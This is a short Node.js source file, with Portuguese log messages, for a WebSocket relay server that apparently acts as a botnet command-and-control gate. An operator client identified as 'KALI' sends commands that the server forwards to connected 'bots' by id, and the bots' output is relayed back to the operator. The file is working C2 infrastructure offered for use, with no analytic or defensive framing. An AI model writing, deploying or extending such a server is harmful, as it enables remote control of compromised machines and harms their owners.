const WebSocket = require('ws');
const server = require('http').createServer((req, res) => res.end('Gate Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    
    if (id === 'KALI') {
        KALI = ws;
        console.log('[!] Operador Conectado.');
        // Sincroniza bots existentes com o novo operador
        BOTS.forEach((_, bid) => KALI.send(JSON.stringify({t:'bot', s:'on', id: bid})));
    } else if (id) {
        BOTS.set(id, ws);
        console.log(`[+] Bot Online: ${id}`);
        if (KALI?.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({t:'bot', s:'on', id}));
        }
    }

    ws.on('message', m => {
        try {
            if (ws === KALI) {
                const d = JSON.parse(m);
                const target = BOTS.get(d.to);
                if (target) target.send(d.cmd);
            } else if (KALI?.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({t:'res', f:id, d:m.toString()}));
            }
        } catch(e) { console.log('Erro de tráfego.'); }
    });

    ws.on('close', () => {
        if (ws === KALI) { KALI = null; }
        else {
            BOTS.delete(id);
            if (KALI?.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({t:'bot', s:'off', id}));
        }
    });
    
    ws.on('error', () => {});
});

server.listen(process.env.PORT || 10000);
